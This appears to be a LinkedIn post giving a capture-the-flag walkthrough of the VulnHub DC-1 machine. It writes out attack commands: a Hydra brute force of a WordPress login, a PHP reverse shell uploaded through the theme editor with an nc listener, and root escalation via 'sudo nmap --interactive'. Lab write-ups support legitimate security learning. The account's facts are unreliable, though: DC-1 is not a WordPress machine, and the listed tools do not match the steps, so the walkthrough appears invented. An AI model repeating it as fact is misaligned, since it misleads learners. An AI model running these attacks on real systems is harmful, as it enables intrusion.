CTF Challenge:- Cracking The DC-1 Machine

Hello, LinkedIn Network!

On the 3-month 15-day journey of Cybersecurity. In the 17th task of ctf machine, this machine as compared to the other machine is less hard than the other machines.
I am very excited to solve these machines, to understand & learn new machines.

🛡️ DC-1 CTF Challenge | Capture The Flag Walkthrough 🛡️:-

 📍 Beginner-Friendly Boot2Root Machine
 🔒 Platform: VulnHub
 🔧 Difficulty: Easy-Medium
 🧰 Tools Used: Nmap, Gobuster, Nikto, Msfconsole, WordPress Exploits

🔍 Challenge Overview:-

The DC-1 machine is designed as a beginner-friendly vulnerable system aimed to sharpen web exploitation, enumeration, and privilege escalation skills. The goal: Capture the root flag by exploiting misconfigurations and weak credentials in a WordPress-based web app.

🧰 Tools Used:-

Nmap: Port scanning & service enumeration
Gobuster: Directory brute-forcing
Nikto: Vulnerability scanner
Hydra: Brute-force credentials
Netcat: Shell access
WPScan: WordPress enumeration & user discovery
Linux Privesc Check: Privilege escalation

🧗‍♂️ My Walkthrough:-

1)Nmap Scan:-
nmap -sC -sV -oN dc1_nmap.txt 192.168.X.X
➤ Found open ports: 80 (HTTP), 22 (SSH)

2)Web Enumeration:-
Accessed WordPress site on port 80
Used Gobuster:
gobuster dir -u http://192.168.X.X -w /usr/share/wordlists/dirb/common.txt
➤ Found /wp-admin/, /wp-login.php, /license.txt

3)WPScan for WordPress Users:-
wpscan --url http://192.168.X.X --enumerate u
➤ Discovered user: admin

4)Brute-force Login using Hydra:-
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.X.X http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid"
➤ Credentials found: admin:admin

5)Gaining Shell Access:-
Uploaded PHP reverse shell via WordPress theme editor
Setup listener:
nc -lvnp 4444
Triggered reverse shell & gained limited shell access

6)Privilege Escalation:-
Checked sudo -l
Found that user can run /usr/bin/nmap with sudo
Escalated using interactive Nmap shell:
sudo nmap --interactive
!/bin/bash
Got root shell ✅

7)Captured the Flag:-
cat /root/flag.txt

🧠 Key Takeaways:-
Enumeration is the key—never underestimate Gobuster and WPScan
WordPress misconfigurations are common entry points
Privilege escalation through misused sudo rights is a valuable technique
Always check for interactive command opportunities in Linux binaries
